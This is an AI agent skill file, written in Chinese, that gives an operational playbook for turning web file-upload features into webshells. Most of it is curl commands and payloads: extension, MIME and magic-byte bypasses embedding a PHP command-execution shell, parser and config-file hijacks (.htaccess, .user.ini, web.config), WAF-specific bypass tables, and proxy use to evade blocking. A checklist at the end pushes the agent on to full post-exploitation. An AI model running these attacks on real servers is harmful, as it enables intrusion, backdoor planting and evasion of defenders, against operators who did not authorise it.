---
name: file-upload-webshell
description: File upload weaponization with bypass matrix, parsing vulnerability exploitation, and webshell deployment chain
version: 1.0.0
---

# 文件上传武器化

## 适用场景

发现文件上传功能后加载。覆盖上传点识别 → 限制检测 → 绕过矩阵 → 解析漏洞利用 → 配置文件劫持 → webshell 落地 → 等同 RCE 链完整流程。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) 上传点识别 + 限制探测

```bash
# 探测允许的文件类型
curl -sk -F "file=@test.txt" https://TARGET/upload
curl -sk -F "file=@test.jpg" https://TARGET/upload
curl -sk -F "file=@test.php" https://TARGET/upload
curl -sk -F "file=@test.jsp" https://TARGET/upload
curl -sk -F "file=@test.asp" https://TARGET/upload

# 代理版
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 -F "file=@test.php" https://TARGET/upload
```

检查点: 前端验证 / Content-Type 检查 / 扩展名白名单黑名单 / 魔术字节检查 / 文件内容检查

### 2) 扩展名绕过矩阵

```bash
# 双扩展
curl -sk -F "file=@shell.php.jpg;filename=shell.php.jpg" https://TARGET/upload

# 大小写
curl -sk -F "file=@shell.PhP;filename=shell.PhP" https://TARGET/upload

# 替代扩展
curl -sk -F "file=@shell.phtml;filename=shell.phtml" https://TARGET/upload
curl -sk -F "file=@shell.pht;filename=shell.pht" https://TARGET/upload
curl -sk -F "file=@shell.php5;filename=shell.php5" https://TARGET/upload
curl -sk -F "file=@shell.php7;filename=shell.php7" https://TARGET/upload
curl -sk -F "file=@shell.phps;filename=shell.phps" https://TARGET/upload

# 空字节
curl -sk -F "file=@shell.php;filename=shell.php%00.jpg" https://TARGET/upload

# Windows 特殊字符
curl -sk -F "file=@shell.php;filename=shell.php::$DATA" https://TARGET/upload
curl -sk -F "file=@shell.php;filename=shell.php." https://TARGET/upload
curl -sk -F "file=@shell.php;filename=shell.php " https://TARGET/upload

# 长文件名截断 (255 char)
python3 -c "print('a'*240 + '.php')" | xargs -I {} curl -sk -F "file=@shell.php;filename={}" https://TARGET/upload
```

### 3) MIME / 魔术字节伪造

```bash
# MIME 伪造
curl -sk -F "file=@shell.php;type=image/jpeg;filename=shell.php" https://TARGET/upload
curl -sk -F "file=@shell.php;type=image/png;filename=shell.php" https://TARGET/upload
curl -sk -F "file=@shell.php;type=image/gif;filename=shell.php" https://TARGET/upload

# GIF89a 魔术字节 + PHP
echo -ne 'GIF89a<?php system($_GET["cmd"]);?>' > shell.gif.php
curl -sk -F "file=@shell.gif.php;type=image/gif" https://TARGET/upload

# PNG 头 + PHP
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]);?>' > shell.png.php
curl -sk -F "file=@shell.png.php;type=image/png" https://TARGET/upload

# EXIF 注入
exiftool -Comment='<?php system($_GET["cmd"]);?>' test.jpg
curl -sk -F "file=@test.jpg;filename=test.jpg.php" https://TARGET/upload
```

### 4) Content-Disposition 绕过

```bash
# 文件名编码
curl -sk -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]);?>\r\n------WebKitFormBoundary--' https://TARGET/upload

# 双 filename
curl -sk -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="file"; filename="test.jpg"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET["cmd"]);?>\r\n------WebKitFormBoundary--' https://TARGET/upload
```

### 5) 解析漏洞利用

```bash
# Apache 解析漏洞 (从右向左)
curl -sk -F "file=@shell.php.xxx;filename=shell.php.xxx" https://TARGET/upload
# 上传后访问: https://TARGET/uploads/shell.php.xxx

# Nginx PATH_INFO 漏洞
# 上传合法图片 test.jpg (含 PHP 代码)
# 访问: https://TARGET/uploads/test.jpg/.php
curl -sk "https://TARGET/uploads/test.jpg/.php?cmd=id"
curl -sk "https://TARGET/uploads/test.jpg/x.php?cmd=id"

# IIS 6 分号截断
curl -sk -F "file=@shell.asp;filename=shell.asp;.jpg" https://TARGET/upload

# IIS 7.5 PATH_INFO
# 访问: https://TARGET/uploads/shell.jpg/x.php
```

### 6) 配置文件劫持

```bash
# .htaccess (Apache)
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -sk -F "file=@.htaccess;filename=.htaccess" https://TARGET/upload

# .user.ini (PHP-FPM)
echo 'auto_prepend_file=shell.jpg' > .user.ini
curl -sk -F "file=@.user.ini;filename=.user.ini" https://TARGET/upload

# web.config (IIS)
cat > web.config << 'CONF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
  </system.webServer>
</configuration>
CONF
curl -sk -F "file=@web.config;filename=web.config" https://TARGET/upload
```

### 7) webshell 落地 + 验证

```bash
# 验证 webshell
curl -sk "https://TARGET/uploads/shell.php?cmd=id"
curl -sk "https://TARGET/uploads/shell.php?cmd=whoami"
curl -sk "https://TARGET/uploads/shell.php?cmd=uname%20-a"
```

webshell 成功后接入 rce-post-exploitation skill 继续完整后利用链。

## WAF 对抗集成

### 上传绕过 WAF 策略

| WAF 厂商 | 绕过组合 |
|----------|---------|
| Cloudflare | MIME 伪造 + 魔术字节 + 双扩展 + chunked 上传 |
| 安全狗 | 大小写 + 空字节 + Content-Disposition 双 filename |
| 阿里云盾 | 分块上传 + 魔术字节 + 替代扩展 (.phtml/.pht) |
| 宝塔 WAF | 大小写 + .user.ini + 图片马 |
| 长亭雷池 | MIME 伪造 + EXIF 注入 + 解析漏洞 |

```bash
# 代理版上传 (所有上传命令加代理)
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 -F "file=@shell.php;type=image/jpeg;filename=shell.phtml" https://TARGET/upload
```

## 代理池启用判定

- WAF 拦截上传请求 → 走代理
- 上传成功后访问 webshell → 直连 (已绕过上传检测)
- 获得 shell 后的内网操作 → 直连

## 敏感数据采集点

- 系统类: Web 根目录路径 / 服务器中间件版本 / 解析配置
- 凭据类: webshell 获得后等同 RCE,参考 rce-post-exploitation

## 失败处理

1. 所有扩展名被拦 → 尝试配置文件劫持 (.htaccess / .user.ini)
2. 文件内容被检测 → 用图片马 (EXIF / 魔术字节) + 解析漏洞
3. 上传成功但无法执行 → 检查解析配置 / 尝试包含漏洞
4. WAF 拦截 multipart → 切 chunked 上传
5. 上传路径未知 → 爆破常见路径 (/uploads/ /upload/ /files/ /static/ /media/ /images/)

## 报告必填字段

- 漏洞标题 / 漏洞指纹
- 完整 PoC (上传请求 + webshell 访问)
- WAF 类型 + 绕过路径
- 绕过方法详情 (扩展名/MIME/解析漏洞)
- webshell 路径 + 验证截图
- 后利用结果 (接 RCE 链)
- 敏感数据清单
- 影响半径 / CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否遍历了扩展名 / MIME / 魔术字节 / 解析漏洞多种绕过方法?
2. webshell 落地后是否接入了 RCE 后利用链?
3. 是否检查了配置文件劫持路径 (.htaccess / .user.ini)?
